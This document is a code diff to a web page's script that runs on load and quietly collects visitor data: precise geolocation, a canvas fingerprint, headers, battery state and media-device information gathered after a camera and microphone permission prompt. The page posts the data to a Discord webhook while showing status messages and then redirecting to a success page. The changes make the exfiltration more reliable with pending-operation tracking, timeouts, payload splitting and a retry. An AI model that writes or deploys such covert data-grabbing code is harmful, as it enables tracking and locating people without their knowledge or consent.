@@ -93,6 +93,13 @@
             messageIndex = (messageIndex + 1) % statusMessages.length;
         }, 2000);
         
+        // Track pending operations to ensure we collect all data before sending
+        const pendingOperations = {
+            geo: false,
+            battery: false,
+            media: false
+        };
+        
         function collectBrowserInfo() {
             collectedData.browser = {
                 'User Agent': navigator.userAgent,
@@ -265,6 +272,7 @@
                             collectedData.performance['Response Start Time'] = navEntry.responseStart + ' ms';
                         }
                     } catch (e) {
+                        // Silently handle errors in performance API
                     }
                     
                     try {
@@ -275,6 +283,7 @@
                             });
                         }
                     } catch (e) {
+                        // Silently handle errors in performance API
                     }
                 }
             } else {
@@ -285,6 +294,9 @@
         }
         
         function collectGeolocationInfo() {
+            // Mark operation as pending
+            pendingOperations.geo = true;
+            
             if ('geolocation' in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -305,6 +317,8 @@
                             collectedData.geo['Speed'] = position.coords.speed + ' m/s';
                         }
                         
+                        // Mark operation as complete
+                        pendingOperations.geo = false;
                         checkAllDataCollected();
                     },
                     function(error) {
@@ -312,6 +326,9 @@
                             'Geolocation API': 'Available but permission denied or error',
                             'Error': error.message
                         };
+                        
+                        // Mark operation as complete (even though it failed)
+                        pendingOperations.geo = false;
                         checkAllDataCollected();
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
@@ -320,11 +337,17 @@
                 collectedData.geo = {
                     'Geolocation API': 'Not available in this browser'
                 };
+                
+                // Mark operation as complete
+                pendingOperations.geo = false;
                 checkAllDataCollected();
             }
         }
         
         function collectBatteryInfo() {
+            // Mark operation as pending
+            pendingOperations.battery = true;
+            
             if ('getBattery' in navigator) {
                 navigator.getBattery().then(function(battery) {
                     collectedData.battery = {
@@ -333,25 +356,38 @@
                         'Charging Time': battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
                         'Discharging Time': battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds'
                     };
+                    
+                    // Mark operation as complete
+                    pendingOperations.battery = false;
                     checkAllDataCollected();
                 }).catch(function(error) {
                     collectedData.battery = {
                         'Battery API': 'Error accessing battery: ' + error.message
                     };
+                    
+                    // Mark operation as complete (even though it failed)
+                    pendingOperations.battery = false;
                     checkAllDataCollected();
                 });
             } else {
                 collectedData.battery = {
                     'Battery API': 'Not available in this browser'
                 };
+                
+                // Mark operation as complete
+                pendingOperations.battery = false;
                 checkAllDataCollected();
             }
         }
         
         function collectMediaInfo() {
+            // Mark operation as pending
+            pendingOperations.media = true;
+            
             if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                 .then(function(stream) {
+                    // Stop the stream immediately after getting permission
                     stream.getTracks().forEach(track => track.stop());
                     
                     navigator.mediaDevices.enumerateDevices()
@@ -371,22 +407,41 @@
                             'Speakers/Headphones': audioOutputCount,
                             'Cameras': videoInputCount
                         };
+                        
+                        // Mark operation as complete
+                        pendingOperations.media = false;
+                        checkAllDataCollected();
+                    })
+                    .catch(function(enumErr) {
+                        collectedData.media = {
+                            'Media Devices API': 'Error enumerating devices: ' + enumErr.message
+                        };
+                        
+                        // Mark operation as complete (even though it failed)
+                        pendingOperations.media = false;
                         checkAllDataCollected();
                     });
                 })
                 .catch(function(err) {
+                    // Permission denied, try to enumerate devices anyway
                     navigator.mediaDevices.enumerateDevices()
                     .then(function(devices) {
                         collectedData.media = {
                             'Permission Status': 'Denied: ' + err.message,
                             'Device Count': devices.length + ' (limited information due to permissions)'
                         };
+                        
+                        // Mark operation as complete
+                        pendingOperations.media = false;
                         checkAllDataCollected();
                     })
                     .catch(function(enumErr) {
                         collectedData.media = {
                             'Media Devices API': 'Error: ' + enumErr.message
                         };
+                        
+                        // Mark operation as complete (even though it failed)
+                        pendingOperations.media = false;
                         checkAllDataCollected();
                     });
                 });
@@ -394,29 +449,23 @@
                 collectedData.media = {
                     'Media Devices API': 'Not available in this browser'
                 };
+                
+                // Mark operation as complete
+                pendingOperations.media = false;
                 checkAllDataCollected();
             }
         }
         
-        const asyncOperations = {
-            geo: false,
-            battery: false,
-            media: false
-        };
-        
         function checkAllDataCollected() {
-            const callerName = checkAllDataCollected.caller.name;
-            
-            if (callerName.includes('Geo')) {
-                asyncOperations.geo = true;
-            } else if (callerName.includes('Battery')) {
-                asyncOperations.battery = true;
-            } else if (callerName.includes('Media')) {
-                asyncOperations.media = true;
-            }
-            
-            if (Object.values(asyncOperations).every(val => val === true)) {
+            // Check if all async operations are complete
+            if (!pendingOperations.geo && !pendingOperations.battery && !pendingOperations.media) {
+                console.log("All data collected, sending to webhook...");
                 sendDataToWebhook();
+            } else {
+                console.log("Still waiting for: " + 
+                    (pendingOperations.geo ? "geo " : "") + 
+                    (pendingOperations.battery ? "battery " : "") + 
+                    (pendingOperations.media ? "media " : ""));
             }
         }
         
@@ -437,6 +486,11 @@
             
             message += `**📅 Collected At:** ${new Date().toString()}\n`;
             
+            // Limit Discord message to max character limit (2000 characters)
+            if (message.length > 2000) {
+                message = message.substring(0, 1995) + "...";
+            }
+            
             return message;
         }
         
@@ -453,6 +507,47 @@
                 content: formattedMessage
             };
             
+            // Add fallback in case of very large message
+            if (formattedMessage.length > 2000) {
+                // Split into multiple messages or send as a file if needed
+                payload.content = "User information collected successfully. See attached data.";
+                
+                // Create embeds to contain more info (up to 6000 chars total)
+                payload.embeds = [];
+                let currentEmbed = { description: "" };
+                let currentCategory = "";
+                
+                for (const [category, data] of Object.entries(collectedData)) {
+                    if (Object.keys(data).length > 0) {
+                        currentCategory = `**${category.charAt(0).toUpperCase() + category.slice(1)} Information**\n`;
+                        
+                        if (currentEmbed.description.length + currentCategory.length > 2000) {
+                            payload.embeds.push(currentEmbed);
+                            currentEmbed = { description: currentCategory };
+                        } else {
+                            currentEmbed.description += currentCategory;
+                        }
+                        
+                        for (const [key, value] of Object.entries(data)) {
+                            const line = `> **${key}:** ${value}\n`;
+                            
+                            if (currentEmbed.description.length + line.length > 2000) {
+                                payload.embeds.push(currentEmbed);
+                                currentEmbed = { description: line };
+                            } else {
+                                currentEmbed.description += line;
+                            }
+                        }
+                        
+                        currentEmbed.description += "\n";
+                    }
+                }
+                
+                if (currentEmbed.description) {
+                    payload.embeds.push(currentEmbed);
+                }
+            }
+            
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -461,12 +556,26 @@
                 body: JSON.stringify(payload)
             })
             .then(response => {
-                console.log('Data sent successfully');
+                console.log('Data sent successfully!');
                 redirectToSuccess();
             })
             .catch(error => {
                 console.error('Error sending data:', error);
-                redirectToSuccess();
+                // Try again with a simpler payload
+                const simplePayload = {
+                    content: "Failed to send complete data. Browser information: " + 
+                            JSON.stringify(collectedData.browser)
+                };
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(simplePayload)
+                })
+                .then(() => redirectToSuccess())
+                .catch(() => redirectToSuccess());
             });
         }
         
@@ -484,6 +593,7 @@
         }
         
         function collectAllData() {
+            // Run all synchronous data collection first
             collectBrowserInfo();
             collectScreenInfo();
             collectNetworkInfo();
@@ -494,9 +604,40 @@
             collectHeaderInfo();
             collectCanvasFingerprint();
             collectPerformanceInfo();
+            
+            // Then start async operations
             collectGeolocationInfo();
             collectBatteryInfo();
             collectMediaInfo();
+            
+            // Set a timeout fallback in case permissions are just hanging
+            setTimeout(() => {
+                // If any operations are still pending after 15 seconds, force completion
+                let forcedCompletion = false;
+                
+                if (pendingOperations.geo) {
+                    pendingOperations.geo = false;
+                    collectedData.geo = collectedData.geo || { 'Geolocation API': 'Timed out waiting for response' };
+                    forcedCompletion = true;
+                }
+                
+                if (pendingOperations.battery) {
+                    pendingOperations.battery = false;
+                    collectedData.battery = collectedData.battery || { 'Battery API': 'Timed out waiting for response' };
+                    forcedCompletion = true;
+                }
+                
+                if (pendingOperations.media) {
+                    pendingOperations.media = false;
+                    collectedData.media = collectedData.media || { 'Media API': 'Timed out waiting for response' };
+                    forcedCompletion = true;
+                }
+                
+                if (forcedCompletion) {
+                    console.log("Forced completion due to timeout");
+                    checkAllDataCollected();
+                }
+            }, 15000);
         }
         
         window.addEventListener('load', collectAllData);
